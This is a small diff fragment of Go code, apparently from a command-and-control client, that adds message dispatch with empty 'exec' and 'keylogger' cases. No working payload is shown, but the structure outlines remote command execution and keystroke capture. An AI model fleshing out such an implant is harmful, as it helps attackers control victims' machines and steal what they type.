@@ -41,6 +41,11 @@ func (c *c2) listenToserver() {
 		if err != nil {
 			return
 		}
+
+		switch msg.Type {
+		case "exec":
+		case "keylogger":
+		}
 	}
 }
 
